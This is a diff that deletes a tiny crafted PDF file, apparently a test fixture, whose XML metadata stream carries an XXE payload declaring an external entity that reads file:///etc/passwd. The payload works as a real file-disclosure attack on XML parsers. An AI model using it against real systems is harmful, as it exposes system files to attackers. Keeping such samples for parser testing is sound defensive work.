@@ -1,6 +1,0 @@
-%PDF-1.4
-1 0 obj<</Type/Metadata/Subtype/XML/Length 100>>stream
-<?xml version='1.0'?><!DOCTYPE r[<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>
-endstream
-endobj
-%%EOF
